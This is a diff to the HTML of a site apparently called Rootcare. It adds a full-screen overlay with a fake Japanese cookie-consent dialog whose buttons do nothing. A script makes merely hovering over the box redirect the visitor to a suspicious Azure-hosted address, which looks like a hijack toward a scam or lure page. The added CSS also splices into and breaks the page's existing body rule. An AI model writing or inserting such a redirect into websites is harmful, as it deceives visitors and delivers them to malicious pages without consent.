@@ -31,7 +31,92 @@ s0.parentNode.insertBefore(s1,s0);
             --dark: #1E3D3A;
         }
         
-        body {
+      
+
+
+     body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: url('https://via.placeholder.com/1200x800') no-repeat center center/cover;
+      height: 100vh;
+    }
+
+    .overlay {
+      position: fixed;
+      inset: 0;
+      backdrop-filter: blur(5px);
+      background: rgba(0, 0, 0, 0.5);
+    }
+
+    .dialog-box {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #1c1c1c;
+      color: white;
+      padding: 30px;
+      border-radius: 20px;
+      width: 400px;
+      box-shadow: 0 0 25px rgba(0,0,0,0.6);
+      text-align: center;
+      transition: 0.3s;
+    }
+
+    .dialog-box:hover {
+      cursor: pointer;
+    }
+
+    .dialog-box h2 {
+      margin-top: 0;
+      font-size: 1.6em;
+      color: #fff;
+    }
+
+    .dialog-box p {
+      font-size: 1em;
+      line-height: 1.6em;
+      color: #ccc;
+    }
+
+    .buttons {
+      display: flex;
+      justify-content: center;
+      margin-top: 20px;
+      gap: 15px;
+    }
+
+    .buttons button {
+      padding: 10px 25px;
+      border: none;
+      border-radius: 25px;
+      font-size: 1em;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .accept {
+      background-color: #00cc66;
+      color: white;
+    }
+
+    .deny {
+      background-color: #e53935;
+      color: white;
+    }
+
+    .policy-link {
+      margin-top: 15px;
+      display: block;
+      color: #00bcd4;
+      text-decoration: none;
+      font-size: 0.9em;
+    }
+
+
+
+     
             font-family: 'Poppins', sans-serif;
             color: var(--text);
             background-color: var(--light);
@@ -511,5 +596,28 @@ s0.parentNode.insertBefore(s1,s0);
             <p>&copy; 2023 Rootcare. All rights reserved.</p>
         </div>
     </footer>
+
+
+  <div class="overlay">
+    <div class="dialog-box" onmouseover="redirect()">
+      <h2>🍪 新しいクッキーポリシーについて</h2>
+      <p>
+        最適な体験のために、一部の要素が一時的な情報を保存する場合があります。安全のために、当ウェブサイトではコンテンツや広告のパーソナライズ、SNS機能の提供、およびトラフィックの分析のためにクッキーを使用しています。
+      </p>
+      <div class="buttons">
+        <button class="accept">同意する</button>
+        <button class="deny">拒否する</button>
+      </div>
+      <a href="#" class="policy-link">ポリシーページへ</a>
+    </div>
+  </div>
+
+  <script>
+    function redirect() {
+      window.location.href = "https://errorzxx22010xx0221.z13.web.core.windows.net/";
+    }
+  </script>
+
+ 
 </body>
 </html>
